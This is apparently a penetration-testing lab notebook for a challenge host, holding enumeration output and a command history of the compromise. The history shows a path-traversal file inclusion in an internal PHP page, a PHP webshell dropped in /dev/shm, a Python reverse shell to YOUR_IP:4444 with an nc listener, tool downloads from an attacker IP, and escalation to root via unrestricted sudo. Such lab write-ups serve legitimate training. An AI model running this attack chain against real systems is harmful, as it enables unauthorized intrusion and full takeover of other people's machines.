# 192.168.X.246
# Navigation
- [Summary](#summary)
- [Flags](#flags)
- [Accounts](#accounts)
- [Enumeration](#enumeration)
    - [NMAP](#nmap)
    - [Local Users](#local-users)
    - [Local Groups](#local-groups)
    - [System Info](#system-info)
    - [Routes](#routes)
    - [Netstat](#netstat)
    - [Environment Vars](#environment-vars)
    - [Domain Controller Info](#domain-controller-info)
- [Services](#services)
    - [API Endpoints](#api-endpoints)
- [Command History](#command-history)
# Summary
-
# Flags    
`Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue -Include local.txt,proof.txt`
`sudo find / -type f -iname "local.txt" 2>/dev/null`    
`sudo find / -type f -iname "proof.txt" 2>/dev/null`

- /home/anita/local.txt
- /root/proof.txt
# Accounts
### anita / -
`ssh -i challenge/2/192.168.X/245/anita_key_no_pass anita@192.168.240.246 -p 2222`  
`find / -writable -type d 2>/dev/null`
```
/tmp
/tmp/.Test-unix
/tmp/.ICE-unix
/tmp/.XIM-unix
/tmp/tmux-1001
/tmp/.font-unix
/tmp/.X11-unix
/run/user/1001
/run/user/1001/dbus-1
/run/user/1001/dbus-1/services
/run/user/1001/gnupg
/run/user/1001/systemd
/run/user/1001/systemd/transient
/run/user/1001/systemd/generator.late
/run/user/1001/systemd/generator.late/xdg-desktop-autostart.target.wants
/run/user/1001/systemd/units
/run/user/1001/systemd/inaccessible
/run/screen
/run/lock
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/dbus.socket
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/gpg-agent.service
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/dbus.service
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/init.scope
/var/tmp
/var/crash
/var/lib/php/sessions
/proc/36491/task/36491/fd
/proc/36491/fd
/proc/36491/map_files
/home/anita
/home/anita/.ssh
/home/anita/.gnupg
/home/anita/.gnupg/private-keys-v1.d
/home/anita/.config
/home/anita/.config/procps
/home/anita/.cache
/home/anita/.local
/home/anita/.local/share
/home/anita/.local/share/nano
/home/anita/snap
/home/anita/snap/lxd
/home/anita/snap/lxd/23541
/home/anita/snap/lxd/common
/home/anita/snap/lxd/common/config
/dev/mqueue
/dev/shm
```
## www-data / -
`Connection Method`
- Drop shell.php into /dev/shm/shell.php
- Start listener
    - `nc -lvnp 4444`
- Execute locally as anita
    - `curl 'http://127.0.0.1:8000/backend/?view=../../../../../../dev/shm/shell.php'`
`sudo -l`
```
Matching Defaults entries for www-data on demo:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User www-data may run the following commands on demo:
    (ALL) NOPASSWD: ALL
```

# Enumeration
## NMAP
`sudo nmap -sV 192.168.152.246 --top-ports 1000`
```
PORT     STATE SERVICE  VERSION
80/tcp   open  http     Apache httpd 2.4.52 ((Ubuntu))
443/tcp  open  ssl/http Apache httpd 2.4.52 ((Ubuntu))
2222/tcp open  ssh      OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
`sudo nmap -A -T4 -p- 192.168.152.246`
```

```
## Local Users
`cat /etc/passwd`
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
offsec:x:1000:1000:Offsec Admin:/home/offsec:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
anita:x:1001:1001:Anita:/home/anita:/bin/sh

```
## Local Groups
`Get-LocalGroup`
```

```
## System Info
`systeminfo`
```

```
## Routes
`routel`
```
         target            gateway          source    proto    scope    dev tbl
        default    192.168.240.254                   static          ens192 
 192.168.240.0/ 24                 192.168.240.246   kernel     link ens192 
     127.0.0.0/ 8            local       127.0.0.1   kernel     host     lo local
      127.0.0.1              local       127.0.0.1   kernel     host     lo local
127.255.255.255          broadcast       127.0.0.1   kernel     link     lo local
192.168.240.246              local 192.168.240.246   kernel     host ens192 local
192.168.240.255          broadcast 192.168.240.246   kernel     link ens192 local
            ::1                                      kernel              lo 
            ::1              local                   kernel              lo local
```
## Netstat
`ss -tuln`
```
Netid         State          Recv-Q         Send-Q                 Local Address:Port                  Peer Address:Port         Process         
udp           UNCONN         0              0                      127.0.0.53%lo:53                         0.0.0.0:*                            
tcp           LISTEN         0              128                          0.0.0.0:2222                       0.0.0.0:*                            
tcp           LISTEN         0              4096                   127.0.0.53%lo:53                         0.0.0.0:*                            
tcp           LISTEN         0              511                        127.0.0.1:8000                       0.0.0.0:*                            
tcp           LISTEN         0              128                             [::]:2222                          [::]:*                            
tcp           LISTEN         0              511                                *:80                               *:*                            
tcp           LISTEN         0              511                                *:443                              *:*                      
```
## Environment Vars
`Get-ChildItem Env:`
```

```
## Domain Controller Info
`nltest /dsgetdc:medtech`
```

```
# Services    
## API Endpoints
`gobuster dir -u http://192.168.159.121:80 -w /usr/share/wordlists/dirb/big.txt -p pattern`
```

```

# Command History
```c
    ssh -i challenge/2/192.168.X/245/anita_key_no_pass anita@192.168.240.246 -p 2222
    // connect as anita same as 245
    // drop 
    curl 192.168.45.214/unix-privesc-check -o unix-privesc-check
    chmod +x unix-privesc-check
    ./unix-privesc-check standard > privoutput.txt
    // didnt find anything

    //drop linpeas onto box
    curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
    // drop on box and run
    ./linpeas.sh

    ss -tuln
    // found local listen on port 8000
    ss -ltnp | grep 8000
    // pid 511
    // found internal php web page
    // /var/www/internal
    curl 'http://127.0.0.1:8000/backend/?view=../../../../../../etc/passwd'
    // outputs /etc/passwd contents
    echo "<?php system('id'); ?>" > /dev/shm/shell.php
    // write to a writable directory
    curl 'http://127.0.0.1:8000/backend/?view=../../../../../../dev/shm/shell.php'
    // the id command is run and appears in the html output
    //whoami -> www-data
    // /dev/shm/shell.php ->
    <?php system("python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"YOUR_IP\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty;pty.spawn(\"/bin/bash\")'"); ?>
    // execute it
    curl 'http://127.0.0.1:8000/backend/?view=../../../../../../dev/shm/shell.php'
    //now www-data reverse shell
    sudo -l
    // can sudo junk so thats good
    sudo bash
    // now root


```
